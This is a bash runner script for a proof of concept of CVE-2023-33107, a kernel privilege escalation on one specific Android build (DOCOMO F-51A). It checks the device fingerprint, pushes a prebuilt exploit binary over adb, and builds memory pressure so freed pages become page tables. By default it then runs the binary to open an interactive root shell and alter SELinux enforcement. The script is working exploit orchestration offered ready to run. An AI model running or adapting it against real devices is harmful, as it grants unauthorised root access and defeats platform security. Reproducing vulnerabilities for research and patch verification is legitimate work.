#!/usr/bin/env bash
# F-51A CVE-2023-33107 reproduction runner.
#
#   ./run.sh              obtain the interactive root shell (default --apply)
#   ./run.sh --self-test  read-only: switch the physical window only
#   ./run.sh --probe-only read-only: also locate selinux_state, write nothing
#
# Only --apply changes kernel state. Nothing is written to any partition and
# every effect disappears on reboot.
set -euo pipefail

cd "$(dirname "$0")"

readonly EXPECTED_FINGERPRINT='DOCOMO/F51A/F51A:12/V71R051A/F51A.20230213:user/release-keys'
readonly ARTIFACT='out/cve-2023-33107-f51a'
readonly REMOTE_BIN='/data/local/tmp/cve-2023-33107-f51a'
readonly REMOTE_DIR='/data/local/tmp'
readonly PRESSURE_MIB_PRIMARY=2560
readonly PRESSURE_MIB_EXTRA=1024
readonly MEMFREE_THRESHOLD_KB=700000

mode="${1:---apply}"
case "$mode" in
  --apply|--probe-only|--self-test) ;;
  *) echo "Unknown mode: $mode (use --apply, --probe-only or --self-test)" >&2
     exit 2 ;;
esac

command -v adb >/dev/null || { echo 'adb was not found.' >&2; exit 1; }
[[ -x "$ARTIFACT" ]] || { echo "Build first with ./build.sh ($ARTIFACT missing)." >&2; exit 1; }

device_count=$(adb devices | awk 'NR > 1 && $2 == "device" { n++ } END { print n + 0 }')
[[ "$device_count" == 1 ]] || {
  echo "Exactly one authorized adb device is required (found $device_count)." >&2
  exit 1
}

fingerprint=$(adb shell getprop ro.build.fingerprint | tr -d '\r')
[[ "$fingerprint" == "$EXPECTED_FINGERPRINT" ]] || {
  echo "Unsupported build: $fingerprint" >&2
  echo "Expected: $EXPECTED_FINGERPRINT" >&2
  exit 1
}

pressure_pids=()

cleanup() {
  local pid
  for pid in "${pressure_pids[@]:-}"; do
    [[ -n "$pid" ]] && adb shell "kill $pid" >/dev/null 2>&1 || true
  done
}
trap cleanup EXIT

memfree_kb() {
  adb shell cat /proc/meminfo | tr -d '\r' | awk '$1 == "MemFree:" { print $2 }'
}

start_pressure() {
  local mib="$1" log="$REMOTE_DIR/mp-$1.log" waited=0 pid
  adb shell "rm -f $log" >/dev/null 2>&1 || true
  adb shell "nohup $REMOTE_BIN --mempressure $mib >$log 2>&1 &" >/dev/null
  until adb shell "grep -s READY $log" | tr -d '\r' | grep -q READY; do
    sleep 2
    waited=$((waited + 2))
    [[ "$waited" -lt 180 ]] || { echo "Memory pressure ($mib MiB) did not report READY." >&2; return 1; }
  done
  pid=$(adb shell "grep -s READY $log" | tr -d '\r' | sed -n 's/.*pid=\([0-9]*\).*/\1/p' | head -1)
  pressure_pids+=("$pid")
  echo "      ${mib} MiB resident, pid $pid"
}

echo "[1/4] Device: $fingerprint"
echo "      kernel: $(adb shell uname -r | tr -d '\r')"
echo "      SELinux before: $(adb shell getenforce | tr -d '\r')  id: $(adb shell id -u | tr -d '\r')"

echo '[2/4] Installing the single artifact.'
adb push "$ARTIFACT" "$REMOTE_BIN" >/dev/null
adb shell "chmod 755 $REMOTE_BIN"

if [[ "$mode" == '--apply' ]]; then
  echo '[3/4] Building memory pressure so freed pages are reused as page tables.'
  start_pressure "$PRESSURE_MIB_PRIMARY"
  free_kb=$(memfree_kb)
  echo "      MemFree now ${free_kb} kB"
  if [[ "${free_kb:-0}" -gt "$MEMFREE_THRESHOLD_KB" ]]; then
    echo "      Above ${MEMFREE_THRESHOLD_KB} kB, adding ${PRESSURE_MIB_EXTRA} MiB."
    start_pressure "$PRESSURE_MIB_EXTRA"
    echo "      MemFree now $(memfree_kb) kB"
  fi
else
  echo '[3/4] Read-only mode: no memory pressure, no kernel write.'
fi

echo "[4/4] Running $mode."
if [[ -t 0 && -t 1 ]]; then
  adb shell -t "cd $REMOTE_DIR && exec $REMOTE_BIN $mode" || true
else
  adb shell "cd $REMOTE_DIR && exec $REMOTE_BIN $mode" || true
fi

if [[ "$mode" == '--apply' ]]; then
  echo
  echo 'State after the run (from a separate ordinary adb shell):'
  adb shell 'getenforce; id' | tr -d '\r'
  echo
  echo "If the run printed repeated errno=12, reboot the device to reset KGSL and retry."
  echo "Reboot also clears every effect of this PoC."
fi
